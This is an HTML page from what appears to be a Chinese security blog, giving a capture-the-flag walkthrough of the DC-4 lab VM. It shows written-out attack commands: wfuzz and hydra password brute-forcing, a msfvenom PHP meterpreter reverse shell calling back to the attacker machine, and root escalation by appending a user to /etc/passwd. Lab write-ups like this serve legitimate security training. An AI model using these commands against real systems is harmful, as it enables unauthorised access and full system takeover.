@@ -1,0 +1,471 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="author" content="magisec网络安全博客" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  
+  
+  <title>DC-4   | magisec网络安全博客</title>
+
+  
+    <link rel="apple-touch-icon" href="https://ae01.alicdn.com/kf/U8f9a193ee8f04b09b08b3d8ceedb159d2.jpg">
+    <link rel="icon" href="https://ae01.alicdn.com/kf/U8f9a193ee8f04b09b08b3d8ceedb159d2.jpg">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  
+<link rel="stylesheet" href="/css/base.css">
+<link rel="stylesheet" href="/iconfont/iconfont.css">
+<link rel="stylesheet" href="/css/github-markdown.css">
+<link rel="stylesheet" href="/css/highlight.css">
+
+
+  <!-- jquery3.3.1 -->
+  <script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+
+  <!-- fancybox -->
+  <link href="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.css" rel="stylesheet">
+  <script async src="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.js"></script>
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+<meta name="generator" content="Hexo 5.3.0"></head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="https://ae01.alicdn.com/kf/U8f9a193ee8f04b09b08b3d8ceedb159d2.jpg" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">Dmagic</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">Home</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about.html">
+          <a href="/about.html">About</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">DC-4</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime" title="Update time"></i>
+          2021-01-03
+        </span>
+        
+      </div>
+      <div class="markdown-body">
+        <h2 id="环境情况"><a href="#环境情况" class="headerlink" title="环境情况"></a>环境情况</h2><p>攻击机IP：192.168.56.105</p>
+<p>靶机IP：192.168.56.130</p>
+<p>修改一下hosts如下：</p>
+<p><img src="https://img.rruu.net/image/6038156eafb75" alt="image-20201229123230114"></p>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -n -sV -p- -oA DC-4 192.168.56.130</span><br></pre></td></tr></table></figure>
+<p><img src="https://img.rruu.net/image/60381573d2854" alt="image-20201229123346821"></p>
+<p>开放：22 80</p>
+<p>22 ssh</p>
+<p>80 http</p>
+<h2 id="80端口渗透"><a href="#80端口渗透" class="headerlink" title="80端口渗透"></a>80端口渗透</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 dirsearch.py -u http:&#x2F;&#x2F;192.168.56.130&#x2F; -e php --full-url</span><br></pre></td></tr></table></figure>
+<p><img src="https://img.rruu.net/image/6038157947890" alt="image-20201229123640964"></p>
+<p>没有发现有价值的东西，我们使用firefox打开web看看，发现一个登陆系统，我们直接使用wfuzz暴力破解。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">firefox http:&#x2F;&#x2F;192.168.56.130</span><br></pre></td></tr></table></figure>
+<p><img src="https://img.rruu.net/image/6038157ee561c" alt="image-20201229132819712"></p>
+<h3 id="使用Wfuzz暴力破解"><a href="#使用Wfuzz暴力破解" class="headerlink" title="使用Wfuzz暴力破解"></a>使用Wfuzz暴力破解</h3><p>检测密码为happy，我们使用happy登录系统。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt  --hh 206 -d &quot;username&#x3D;admin&amp;password&#x3D;FUZZ&quot; http:&#x2F;&#x2F;192.168.56.130&#x2F;login.php</span><br></pre></td></tr></table></figure>
+<p><img src="https://img.rruu.net/image/60381583f0c0f" alt="image-20201229132931955"></p>
+<p>登录成功</p>
+<p><img src="https://img.rruu.net/image/603815891f364" alt="image-20201229133304239"></p>
+<h3 id="挖掘命令执行"><a href="#挖掘命令执行" class="headerlink" title="挖掘命令执行"></a>挖掘命令执行</h3><p>进入command，点击run。</p>
+<p><img src="https://img.rruu.net/image/6038158e483e5" alt="image-20201229133713664"></p>
+<p>使用burpsuite抓包查看</p>
+<p><img src="https://img.rruu.net/image/60381594e9b30" alt="image-20201229133648803"></p>
+<p>输入id尝试一下</p>
+<p><img src="https://img.rruu.net/image/6038159b1826b" alt="image-20201229133810805"></p>
+<h4 id="msf反弹shell"><a href="#msf反弹shell" class="headerlink" title="msf反弹shell"></a>msf反弹shell</h4><p>msf生成phpshell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.56.105 LPORT&#x3D;9000 -f raw &gt; shell.php</span><br></pre></td></tr></table></figure>
+<p><img src="https://img.rruu.net/image/603815a0c1892" alt="image-20201229133925138"></p>
+<p>burpsuite写入shell</p>
+<p><img src="https://img.rruu.net/image/603815a682c25" alt="image-20201229134446931"></p>
+<p>查看tmp目录的shell是否写入</p>
+<p><img src="https://img.rruu.net/image/603815ae30577" alt="image-20201229134500673"></p>
+<p>msf设置监听会话</p>
+<p><img src="https://img.rruu.net/image/603815b4662d7" alt="image-20201229134621483"></p>
+<p>使用php运行shell.php</p>
+<p><img src="https://img.rruu.net/image/603815bc1cfb7" alt="image-20201229134641614"></p>
+<p>成功回弹shell</p>
+<p><img src="https://img.rruu.net/image/603815c378928" alt="image-20201229134659936"></p>
+<h2 id="特权提升"><a href="#特权提升" class="headerlink" title="特权提升"></a>特权提升</h2><h3 id="python切换bash"><a href="#python切换bash" class="headerlink" title="python切换bash"></a>python切换bash</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#39;import pty;pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br></pre></td></tr></table></figure>
+<p><img src="https://img.rruu.net/image/603815c9e0273" alt="image-20201229134807967"></p>
+<p>收集用户信息</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -la &#x2F;home</span><br></pre></td></tr></table></figure>
+<p><img src="https://img.rruu.net/image/603815cfe3826" alt="image-20201229135046429"></p>
+<h3 id="使用hydra爆破ssh"><a href="#使用hydra爆破ssh" class="headerlink" title="使用hydra爆破ssh"></a>使用hydra爆破ssh</h3><p>保存用户名到txt</p>
+<p><img src="https://img.rruu.net/image/603815d63a95b" alt="image-20201229135227404"></p>
+<p>发现密码备份文件，回传到本地。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -la &#x2F;home&#x2F;jim&#x2F;backups</span><br></pre></td></tr></table></figure>
+<p><img src="https://img.rruu.net/image/603815dca8dc8" alt="image-20201229135846253"></p>
+<p>开始爆破，耐心等待结果。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L user.txt -P old-passwords.bak 192.168.56.130 ssh -t 32</span><br></pre></td></tr></table></figure>
+<p><img src="https://img.rruu.net/image/603815e5a4cba" alt="image-20201229140324447"></p>
+<p>使用jim进行ssh登录</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh jim@192.168.56.130</span><br></pre></td></tr></table></figure>
+<p><img src="https://img.rruu.net/image/603815ed58fdd" alt="image-20201229140446749"></p>
+<p>查看mbox文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat mbox</span><br></pre></td></tr></table></figure>
+<p><img src="https://img.rruu.net/image/603815f3c985a" alt="image-20201229140508894"></p>
+<p>查看mail文件夹</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls &#x2F;var&#x2F;mail</span><br></pre></td></tr></table></figure>
+<p><img src="https://img.rruu.net/image/603815f969aa5" alt="image-20201229140759660"></p>
+<p>读取邮件，发现charles用户密码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat jim</span><br></pre></td></tr></table></figure>
+<p><img src="https://img.rruu.net/image/603815ff0473c" alt="image-20201229140824975"></p>
+<p>su切换用户</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su charles</span><br></pre></td></tr></table></figure>
+<p><img src="https://img.rruu.net/image/603816047c3dc" alt="image-20201229140851469"></p>
+<h3 id="teehee提权"><a href="#teehee提权" class="headerlink" title="teehee提权"></a>teehee提权</h3><p>查看sudo配置</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
+<p><img src="https://img.rruu.net/image/6038160959869" alt="image-20201229140935229"></p>
+<p>查看使用说明，发现是一个类似于复制文件的功能的文件。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo teehee --help</span><br></pre></td></tr></table></figure>
+<p><img src="https://img.rruu.net/image/6038160e3c417" alt="image-20201229141123823"></p>
+<p>切回kali，生成passwd</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl passwd -1 -salt magisec 123456</span><br></pre></td></tr></table></figure>
+<p><img src="https://img.rruu.net/image/603816137e7e3" alt="image-20201229141354476"></p>
+<p>追加passwd文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &#39;magisec:$1$magisec$921bybGVs5PblAXFXFeC&#x2F;&#x2F;:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash&#39; | sudo teehee -a &#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>
+<p><img src="https://img.rruu.net/image/6038161853e32" alt="image-20201229141422380"></p>
+<p>查看passwd文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>
+<p><img src="https://img.rruu.net/image/6038161da50a1" alt="image-20201229141442254"></p>
+<p>切换magisec用户，完成提权。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su magisec</span><br></pre></td></tr></table></figure>
+<p><img src="https://img.rruu.net/image/60381623562da" alt="image-20201229141507850"></p>
+<p>获取flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat flag.txt</span><br></pre></td></tr></table></figure>
+<p><img src="https://img.rruu.net/image/603816288c738" alt="image-20201229141529179"></p>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/2021/01/01/DC-3/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>Prev</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime" title="Update time"></i>
+              2021-01-03
+            </span>
+            
+          </div>
+          <div class="post-foot-prev">
+            
+              <a href="/2021/01/06/DC-5/" target="_self">
+                <span>Next</span>
+                <i class="iconfont icon-chevronright"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div class="post-catalog" id="catalog">
+    <div class="title">Contents</div>
+    <div class="catalog-content">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%83%85%E5%86%B5"><span class="toc-text">环境情况</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#80%E7%AB%AF%E5%8F%A3%E6%B8%97%E9%80%8F"><span class="toc-text">80端口渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8Wfuzz%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3"><span class="toc-text">使用Wfuzz暴力破解</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8C%96%E6%8E%98%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-text">挖掘命令执行</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#msf%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">msf反弹shell</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%89%B9%E6%9D%83%E6%8F%90%E5%8D%87"><span class="toc-text">特权提升</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#python%E5%88%87%E6%8D%A2bash"><span class="toc-text">python切换bash</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8hydra%E7%88%86%E7%A0%B4ssh"><span class="toc-text">使用hydra爆破ssh</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#teehee%E6%8F%90%E6%9D%83"><span class="toc-text">teehee提权</span></a></li></ol></li></ol>
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+
+
+
+      </div>
+    
+  </div>
+
+
+        <div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          <a title="github" target="_blank" rel="noopener" href="https://github.com/magisec/">
+            <i class="iconfont icon-github"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+  
+    <div class="footer-more">
+      <a href="">Copyright © magisec 2021</a>
+    </div>
+  
+</div>
+
+      </div>
+
+      <div class="back-to-top hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+      
+  <div class="search-icon" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="Search...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>First search, index file loading, please wait...<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>No result<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The search.xml file was not found, please refer to：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The request failed, Try to refresh the page or try again later.<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+    </div>
+  </body>
+</html>
